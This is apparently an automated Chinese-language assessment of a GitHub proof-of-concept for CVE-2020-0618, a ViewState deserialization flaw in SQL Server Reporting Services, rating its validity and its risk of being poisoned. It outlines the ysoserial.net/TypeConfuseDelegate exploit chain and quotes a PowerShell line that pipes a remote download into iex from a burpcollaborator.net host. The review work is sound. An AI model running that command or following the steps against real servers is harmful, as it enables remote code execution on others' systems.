## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 受影响版本包括SQL Server 2012 SP4, 2014 SP3, 2016 SP2 等，具体参考漏洞库信息

**利用条件:** 需要能够访问SSRS服务的web页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2020-0618是一个存在于Microsoft SQL Server Reporting Services中的远程代码执行漏洞。该漏洞是由于SSRS未能正确处理页面请求导致的，更具体地说，是由于`ViewState`反序列化漏洞。攻击者可以通过发送特制的页面请求，利用不安全的`LosFormatter`反序列化过程执行任意代码。

**有效性：**
提供的POC代码看起来有效。它使用了`ysoserial.net`工具生成恶意的序列化payload，并使用`TypeConfuseDelegate` gadget，该gadget常用于.NET反序列化漏洞的利用。Payload中嵌入了powershell命令，用于执行任意代码，例如通过`iwr`下载并执行远程脚本。

**投毒风险：**
该仓库存在一定的投毒风险。虽然主要的漏洞利用代码看起来是合理的，但以下几点需要注意：
*   POC代码中的`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`，该URL指向一个外部资源，如果该资源被篡改，则可能导致执行恶意代码。
*   虽然利用代码看起来像是合法的利用，但仍然要谨慎，由于 `burpcollaborator.net` 域名是一种常用的渗透测试工具，虽然在本次上下文中不一定是恶意的，但也增加了投毒的概率.
综合考虑，评估投毒风险为10%。主要风险在于外部URL和潜在的payload。

**利用方式：**
1.  攻击者首先需要确定目标SSRS服务器存在CVE-2020-0618漏洞。
2.  使用`ysoserial.net`工具，基于`TypeConfuseDelegate` gadget和`LosFormatter`格式，生成包含恶意powershell命令的序列化payload。
3.  恶意powershell命令会被编码成Base64字符串。
4.  攻击者构造包含该payload的恶意请求，发送到SSRS服务器的web页面。漏洞利用链大致如下：网页请求->ViewState->LosFormatter反序列化->TypeConfuseDelegate -> Powershell RCE
5.  SSRS服务器在处理请求时，会反序列化`ViewState`，由于`LosFormatter`的不安全性，会导致代码执行。`TypeConfuseDelegate` gadget会将反序列化过程导向恶意代码。
6.  最终，服务器会执行payload中嵌入的powershell命令，攻击者从而获得远程代码执行的能力。

**项目地址:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)